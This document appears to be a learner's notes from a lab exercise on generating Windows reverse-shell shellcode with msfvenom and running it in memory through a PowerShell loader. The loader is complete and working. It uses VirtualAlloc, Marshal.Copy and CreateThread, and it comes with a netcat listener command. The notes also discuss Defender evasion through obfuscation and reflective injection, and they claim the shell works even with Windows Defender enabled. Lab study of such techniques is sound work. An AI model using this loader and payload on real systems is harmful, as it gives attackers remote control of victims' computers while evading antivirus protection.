- Grasp the fundamentals of writing shellcode ✅
- Generate shellcode for reverse shells ✅
- Executing shellcode with PowerShell ✅

# TLDR:
- **Shellcode**: Small, exploitative code (often in assembly) used for attacks like buffer overflows to execute commands or gain control over systems.

- **PowerShell**: Windows scripting tool for task automation, frequently abused by attackers for post-exploitation due to its access to system internals and ability to avoid disk-based detection.

- **Windows Defender**: Security software to detect malicious scripts, which attackers bypass using obfuscation or reflective injection to load code into memory.

- **Windows API**: Interfaces allowing interaction with the operating system. Commonly exploited functions include `VirtualAlloc`, `CreateThread`, and `WaitForSingleObject`.

- **PowerShell Reflection**: Technique to dynamically call Windows API functions in PowerShell, enabling stealthy execution of code.

- **Reverse Shell**: A connection where the target system (victim) connects back to the attacker’s machine, providing remote access.
  
# Exploit:
1. **Generate Shellcode:** Using msfvenom we generate shellcode for PowerShell: 
	`msfvenom -p windows/x64/shell_reverse_tcp LHOST=VM_IP LPORT=1111 -f powershell`
2. **Prepare Execution Script**: 
   * Use PowerShell with embedded C# code to dynamically call Windows API functions.
   * Insert generated shellcode into the script as hex-encoded byte array
   * Allocate memory with `VirtualAlloc`, copy shellcode, create a new thread to execute the shellcode and wait for completion.
3. Depoly 
# Deepened:
## Essential Terminologies
- **Shellcode**: A piece of code usually used by malicious actors during exploits like **buffer overflow** attacks to inject commands into a vulnerable system, often leading to executing arbitrary commands or giving attackers control over a compromised machine. Shellcode is typically written in assembly language and delivered through various techniques, depending on the exploited vulnerability.

- **PowerShell**: A powerful scripting language and command-line shell built into **Windows** for **task automation** and **configuration management**. It allows users to interact with system components and is widely used by administrators for legitimate purposes. However, attackers often use PowerShell as **a post-exploitation** tool because of its deep access to system resources and ability to run scripts directly in memory, **avoiding disk-based detection mechanisms.**

- **Windows Defender**: A built-in security feature that detects and prevents malicious scripts, including PowerShell-based attacks, by scanning code at runtime. Common bypass methods for evading Defender include **obfuscating scripts** to disguise malicious content, making it harder for the software to recognise known patterns. Another technique is a **reflective injection**, where malicious code is loaded directly into memory, avoiding detection by signature-based defences.  

- **Windows API**: The Windows Application Programming Interface (**API**) allows programs to interact with the underlying operating system, giving them access to essential system-level functions such as memory management, file operations, and networking. It serves **as a bridge between the application and the operating system**, enabling efficient resource handling. The Windows **API** is crucial because many exploitation techniques and malware rely on it to manipulate processes, allocate memory, and execute **shellcodes**. Common Windows **API** functions frequently used by malicious actors include:
   `VirtualAlloc`, 
   `CreateThread` and
	`WaitForSingleObject`
	which we will also use in this task for exploitation.

- **Accessing Windows API through PowerShell Reflection**: Windows **API** via PowerShell Reflection is an advanced technique that enables dynamic interaction with the Windows **API** from PowerShell. Instead of relying on precompiled binaries, PowerShell Reflection allows attackers to call Windows API functions directly at runtime. This will enable them to manipulate low-level system processes, making it a primary tool for bypassing security mechanisms, interacting with the operating system, and executing code stealthily.

- **Reverse shell**: A type of connection in which the target (the machine you're trying to hack) initiates a connection back to your attacking machine.
  ![[62a7685ca6e7ce005d3f3afe-1728375153734.png]]
  ---
## Generating Shellcode
Let's learn how to generate a shellcode to see what it looks like. To do this, we can use a tool called `msfvenom` to get a reverse shell.  

In your VM, open the terminal and enter the command
 `msfvenom -p windows/x64/shell_reverse_tcp LHOST=VM_IP LPORT=1111 -f powershell` 
 that will generate the shellcode. The output will look like the following.  
> **NOTE**: You will require to replace the `VM_IP` with the IP of your VM:

![[Pasted image 20241215155644.png]]

The above command generates a piece of shellcode, here's what each part means:
1.  `-p windows/x64/shell_reverse_tcp`: The `-p` flag tells `msfvenom` what type of payload to create. `windows/x64/shell_reverse_tcp` specifies that we want a reverse shell for a Windows machine.
2.  `LHOST=ATTACKBOX_IP`: This is the IP address of your VM. It tells the reverse shell where to connect back to.
3. `LPORT=1111`: This is the port number on your machine that will listen for the reverse shell connection. When the target connects back to you, it will use this port (`1111` in this example). You can choose any available port, but it needs to match with what your listener is set to.
4. `-f powershell`: This specifies the format for the output. In this case, we want the payload to be in PowerShell format so it can be executed as a script on a Windows machine.
---
### Where is the Actual Shellcode?
The actual shellcode in the output above is the **hex-encoded byte array**, which starts with `0xfc, 0xe8, 0x82`, and so on. The hexadecimal numbers represent the instructions set on the target machine. Computers understand binary (1s and 0s), but hex numbers are just a more human-readable version. So, instead of seeing long strings of 1s and 0s, you see something like `0xfc` instead.

We can execute this **shellcode** by loading it into memory and then creating a thread for its execution. In this case, we will use **PowerShell** to call a few Windows **APIs** via **C#** code. Below is a simple PowerShell script that will execute our shellcode:
```powershell
$VrtAlloc = @"
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
}
"@

Add-Type $VrtAlloc 

$WaitFor= @"
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
}
"@

Add-Type $WaitFor

$CrtThread= @"
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
}
"@
Add-Type $CrtThread   

[Byte[]] $buf = SHELLCODE_PLACEHOLDER
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```
That's a lot of code, but let's break down what it does.

If you're new, memorising these functions is unnecessary. Most penetration testers use pre-made or automated tools to run **shellcode**, so you don't have to know every technical detail to complete the job. 
### Code Explanation
The script starts by defining a few **C#** classes. These classes use the `DllImport` attribute to load specific functions from the `kernel32` **DLL**, which is part of the Windows **API**.  

- `VirtualAlloc`: This function allocates memory in the process's address space. It's commonly used in scenarios like this to prepare memory for storing and executing shellcode.
- `CreateThread`: This function creates a new thread in the process. The thread will execute the shellcode that has been loaded into memory.
- `WaitForSingleObject`: This function pauses execution until a specific thread finishes its task. In this case, it ensures that the shellcode has completed execution.

These classes are then added to **PowerShell** using the `Add-Type` command, allowing **PowerShell** to use these functions.
#### Storing the Shellcode in a Byte Array
Next, the script stores the shellcode in the `$buf` variable, a byte array. In the code above, `SHELLCODE_PLACEHOLDER` is there to show where you would insert the actual shellcode. Usually, you'd replace it with the real shellcode, represented as a series of hexadecimal values. These hex values are the instructions that will be executed when the shellcode runs.
#### Allocating Memory for the Shellcode
The `VirtualAlloc` function then allocates a block of memory where the shellcode will be stored:
- `0` for the memory address, meaning that Windows will decide where to allocate the memory.
- `$size` for the size of the memory block, which is determined by the length of the shellcode.
- `0x3000` for the allocation type, which tells Windows to reserve and commit the memory.
- `0x40` for memory protection, the memory is readable and executable (necessary for executing shellcode).

After memory is allocated, the `Marshal.Copy` function copies the **shellcode** from the `$buf` array into the allocated memory address (`$addr`), preparing it for execution.
#### Executing the Shellcode and Waiting for Completion
Once the shellcode is stored in memory, the script calls the `CreateThread` function to execute the shellcode by creating a new thread. This thread is instructed to start execution from the memory address where the shellcode is located (`$addr`). The script then uses the `WaitForSingleObject` function, ensuring it waits for the shellcode execution to finish before continuing. This makes sure that the shellcode runs completely before the script ends its execution.
### Time for Some Action - Executing the Shellcode
On your VM, execute the command `nc -nvlp 1111` to start a listener on port `1111` and wait for an incoming connection. This command opens port `1111` and listens for connections, allowing your VM to receive data once a connection is made:
![[Pasted image 20241215161459.png]]
On your VM, begin by navigating to the Desktop. Right-click on the `Desktop`, select `Create Document`, and then choose `Empty File`. Open this new file and paste the previously provided PowerShell script code into it. Look for the part labelled `SHELLCODE_PLACEHOLDER` and replace it with the shell code we previously created with `msfvenom`:
![[Pasted image 20241215161546.png]]
Once you've added the shellcode navigate to the windows VM, open PowerShell and paste parts of the code from the document you recently created to the Windows PowerShell window. For example, the first part to copy and paste is the block below:
```powershell
$VrtAlloc = @"
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
}
"@

Add-Type $VrtAlloc 

$WaitFor= @"
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
}
"@

Add-Type $WaitFor

$CrtThread= @"
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
}
"@
Add-Type $CrtThread   
```
Then paste this line, replacing the placeholder:
```powershell
[Byte[]] $buf = SHELLCODE_PLACEHOLDER
```
Then copy these lines **one by one:**
```powershell
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

If done properly, the PowerShell terminal in the VM will look like the screenshot below:
![[62a7685ca6e7ce005d3f3afe-1732698537726.png]]
Once you execute the final line in the PowerShell terminal and press `Enter`, you will get a reverse shell in your VM, giving you complete access to the computer even if the Windows Defender is enabled. Now you can issue any command, like issuing `dir`, which will list all the directories:
![[62a7685ca6e7ce005d3f3afe-1727972837925.png]]
